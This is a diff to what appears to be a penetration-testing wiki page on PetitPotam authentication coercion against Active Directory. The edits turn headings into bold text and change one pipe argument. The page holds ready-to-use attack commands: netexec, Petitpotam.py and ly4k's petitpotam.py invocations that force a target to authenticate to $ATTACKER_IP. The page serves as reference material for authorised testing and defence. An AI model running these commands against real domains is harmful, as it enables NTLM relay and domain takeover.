@@ -25,7 +25,7 @@ netexec smb <TARGET> -u <USER> -p <PASSWORD> -M petitpotam -o PIPE=netlogon
 {% endtab %}
 
 {% tab title="Exploit" %}
-#### Topotam's exploit
+**Topotam's exploit**
 
 An authentication can be forced with the original author's proof-of-concepts dubbed "[PetitPotam](https://github.com/topotam/PetitPotam)" (available in C and Python) by using a valid AD account's credentials.
 
@@ -33,16 +33,16 @@ An authentication can be forced with the original author's proof-of-concepts dub
 Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
 ```
 
-#### ly4k's exploit
+**ly4k's exploit**
 
 An alternative Python implementation ([https://github.com/ly4k/PetitPotam](https://github.com/ly4k/PetitPotam)) can be used to exploit other unpatched methods that the original implementation doesn't feature.
 
 ```bash
 # With $TARGET as [[domain/]username[:password]@]<targetName or address>
-petitpotam.py -method AddUsersToFile -pipe netlogon $TARGET '\\$ATTACKER_IP\share\foo'
+petitpotam.py -method AddUsersToFile -pipe lsarpc $TARGET '\\$ATTACKER_IP\share\foo'
 ```
 
-#### Coercer
+**Coercer**
 
 Yet another alternative is to use the [Coercer](https://github.com/p0dalirius/Coercer/tree/master) tool (python) as follow.
 
